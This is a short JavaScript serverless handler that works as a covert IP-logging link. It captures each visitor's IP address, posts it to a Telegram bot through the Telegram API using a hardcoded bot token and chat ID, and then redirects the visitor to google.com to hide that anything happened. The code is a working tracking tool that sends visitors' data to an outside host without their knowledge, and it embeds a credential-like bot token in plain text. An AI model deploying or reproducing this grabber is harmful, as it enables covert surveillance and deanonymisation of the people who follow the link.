export default async function handler(req, res) {
  const TELEGRAM_BOT_TOKEN = "8821372704:AAFGK-rlDlsfyoKgzEZ2NUdGWsql11KWOsY";
  const TELEGRAM_CHAT_ID = "8821372704";
  const clientIp = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: `New visit! IP Address: ${clientIp}` })
  });
  res.writeHead(302, { Location: "https://www.google.com" });
  res.end();
}
